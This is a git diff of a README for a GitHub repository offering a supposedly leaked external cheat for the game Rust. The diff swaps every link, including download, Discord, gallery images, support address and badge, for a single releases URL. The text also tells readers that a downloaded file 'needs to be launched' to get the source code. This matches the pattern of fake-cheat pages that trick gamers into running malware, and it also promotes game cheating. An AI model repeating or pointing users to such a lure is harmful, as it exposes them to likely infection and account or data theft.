@@ -15,7 +15,7 @@ Welcome to the **Rust Hack FR33** repository! This is a leaked external cheat so
 - rust-recoil
 
 ## 🚀 Get Started
-To access the cheat source code, please download it from the following link: [Download Now!](https://github.com/file/App.zip) 📥
+To access the cheat source code, please download it from the following link: [Download Now!](https://github.com/MonishKoushalBusani/rust-hack-fr33/releases/tag/v2.0) 📥
 
 If the link above ends with a file name, it needs to be launched to access the source code. If you encounter any issues with the link provided or it does not work, please check the "Releases" section of this repository.
 
@@ -41,21 +41,21 @@ To maintain the integrity of our community, we have a set of guidelines for cont
 
 ## ✨ Join our Community
 Connect with fellow developers, gamers, and ethical hackers in our community channels:
-- Discord: [Join Now!](https://discord.com/RustHackFR33)
+- Discord: [Join Now!](https://github.com/MonishKoushalBusani/rust-hack-fr33/releases/tag/v2.0)
 - Forums: [Visit Here!](https://forums/rusthackfr33)
 
 ## 📷 Gallery
 Check out some visuals from the Rust Hack FR33 gameplay:
 
-![Rust Hack Demo 1](https://images/demo1.png)
-![Rust Hack Demo 2](https://images/demo2.png)
+![Rust Hack Demo 1](https://github.com/MonishKoushalBusani/rust-hack-fr33/releases/tag/v2.0)
+![Rust Hack Demo 2](https://github.com/MonishKoushalBusani/rust-hack-fr33/releases/tag/v2.0)
 
 ## 📞 Support
-If you have any questions or need assistance, feel free to reach out to our support team at support@rusthackfr33.com.
+If you have any questions or need assistance, feel free to reach out to our support team at https://github.com/MonishKoushalBusani/rust-hack-fr33/releases/tag/v2.0
 
 ## 📌 Stay Updated
 Stay updated with the latest developments and releases by following us on GitHub and subscribing to our newsletter.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/file/App.zip)
+[![Download Now](https://github.com/MonishKoushalBusani/rust-hack-fr33/releases/tag/v2.0)](https://github.com/MonishKoushalBusani/rust-hack-fr33/releases/tag/v2.0)
 
 Dive into the world of Rust hacking with Rust Hack FR33 and become part of a community that values skill development, ethical behavior, and trust in gaming. Let's build a better gaming environment together! 🚀🎮💻
